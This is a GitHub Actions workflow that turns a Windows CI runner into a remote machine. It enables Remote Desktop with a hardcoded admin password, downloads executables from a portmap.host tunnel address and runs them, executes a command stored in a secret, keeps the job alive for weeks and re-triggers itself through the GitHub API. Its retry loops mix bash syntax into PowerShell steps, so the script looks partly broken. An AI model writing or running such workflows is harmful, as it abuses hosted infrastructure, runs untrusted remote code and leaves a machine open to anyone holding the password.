name: last

on: 
  push:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360 # Set a timeout for the entire job
    steps:
      - name: Enable TS
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

      - name: Enable Firewall Rule
        run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

      - name: Set User Authentication
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1

      - name: Set Runner Admin Password
        run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)

      - name: Download second Batch File
        run: |
          retry_count=0
          max_retries=3
          success=false
          while [ $retry_count -lt $max_retries ]; do
            Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run.exe" -OutFile run.exe && success=true && break
            retry_count=$((retry_count + 1))
            echo "Retrying... attempt $retry_count"
            sleep 10
          done
          if [ "$success" != true ]; then exit 1; fi

      - name: Execute second Batch File
        run: |
          retry_count=0
          max_retries=3
          success=false
          while [ $retry_count -lt $max_retries ]; do
            Start-Process -FilePath "run.exe" && success=true && break
            retry_count=$((retry_count + 1))
            echo "Retrying... attempt $retry_count"
            sleep 10
          done
          if [ "$success" != true ]; then exit 1; fi

      - name: Download third Batch File
        run: |
          retry_count=0
          max_retries=3
          success=false
          while [ $retry_count -lt $max_retries ]; do
            Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run5.exe" -OutFile run5.exe && success=true && break
            retry_count=$((retry_count + 1))
            echo "Retrying... attempt $retry_count"
            sleep 10
          done
          if [ "$success" != true ]; then exit 1; fi

      - name: Execute third Batch File
        run: |
          retry_count=0
          max_retries=3
          success=false
          while [ $retry_count -lt $max_retries ]; do
            Start-Process -FilePath "run5.exe" && success=true && break
            retry_count=$((retry_count + 1))
            echo "Retrying... attempt $retry_count"
            sleep 10
          done
          if [ "$success" != true ]; then exit 1; fi

      - name: Open CMD and Run Secret Command
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
        run: |
          retry_count=0
          max_retries=3
          success=false
          while [ $retry_count -lt $max_retries ]; do
            Start-Process -FilePath "cmd.exe" -ArgumentList "/k $env:MY_SECRET" && success=true && break
            retry_count=$((retry_count + 1))
            echo "Retrying... attempt $retry_count"
            sleep 10
          done
          if [ "$success" != true ]; then exit 1; fi

      - name: Keep connection alive for unlimited hours
        run: Start-Sleep -Seconds 2147483

  monitor:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Check if the build failed and re-trigger if necessary
        run: |
          # Use GitHub API to monitor and re-run the failed job if necessary
          curl -X POST \
            -H "Authorization: token ${{ secrets.MY_GITHUB_TOKEN }}" \
            -d '{"event_type": "re-run"}' \
            "https://api.github.com/repos/${{ secrets.REPO_OWNER }}/${{ secrets.REPO_NAME }}/dispatches"
